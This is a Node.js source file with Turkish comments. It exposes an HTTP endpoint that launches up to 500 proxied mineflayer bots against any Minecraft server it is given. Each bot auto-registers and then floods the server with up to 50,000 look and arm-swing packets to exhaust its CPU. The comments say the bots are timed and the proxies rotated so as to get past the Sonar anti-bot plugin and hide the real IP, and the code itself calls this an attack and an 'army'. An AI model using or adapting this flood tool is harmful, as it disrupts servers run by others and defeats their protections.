const mineflayer = require('mineflayer');
const { ProxyAgent } = require('proxy-agent');
const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

// 🛡️ VIP PROXY LİSTESİ (Gerçek IP Gizliliği)
const proxyList = [
    "socks5://ip:port",
    "http://ip:port"
    // Burayı doldurmayı unutma kanka!
];

let activeBots = [];

app.post('/deploy', (req, res) => {
    const { ip, count } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    console.log(`[VIP ELITE] Hedef: ${host} | Paket Kapasitesi: 50.000`);

    for (let i = 0; i < Math.min(count, 500); i++) {
        setTimeout(() => {
            const currentProxy = proxyList[i % proxyList.length];
            if (!currentProxy) return;

            const agent = new ProxyAgent(currentProxy);

            const bot = mineflayer.createBot({
                host: host,
                port: port,
                username: `Trgr_Vip_${Math.floor(Math.random() * 90000) + 10000}`,
                version: false,
                agent: agent,
                hideErrors: true
            });

            // 🛡️ SONAR / ANTI-CHEAT BYPASS
            bot.on('spawn', () => {
                console.log(`[+] ${bot.username} Sızdı.`);
                
                // 1. GİRİŞ VE KAYIT SİSTEMİ
                setTimeout(() => {
                    // Sunucu mesajlarını dinleyip /login mi /register mı gerektiğini anlar
                    bot.chat(`/register resul3163 resul3163`);
                    bot.chat(`/login resul3163`);
                }, 2000);

                // 2. 50.000 PAKET STRESS TESTİ (CPU Yorma)
                // Sonar gibi eklentilerin hareket hızından banlamaması için 
                // paketleri "Position" değil, "HeadLook" ve "Swing" üzerinden yollarız.
                let packetCount = 0;
                const stressInterval = setInterval(() => {
                    if (packetCount >= 50000 || !bot.entity) {
                        clearInterval(stressInterval);
                        return;
                    }
                    
                    // Sunucuyu meşgul eden sessiz paketler
                    bot.look(Math.random() * 360, Math.random() * 90);
                    bot.swingArm('right');
                    packetCount += 2; // Her döngüde 2 paket
                }, 10); // Milisaniyelik saldırı
            });

            bot.on('error', (err) => console.log(`[!] Hata: ${err.message}`));
            activeBots.push(bot);
        }, i * 2000); // 2 saniye kuralı (Sonar Bypass)
    }
    res.json({ success: true, message: "50.000 Paket Kapasiteli Ordu Sevk Edildi!" });
});

app.listen(process.env.PORT || 3000);
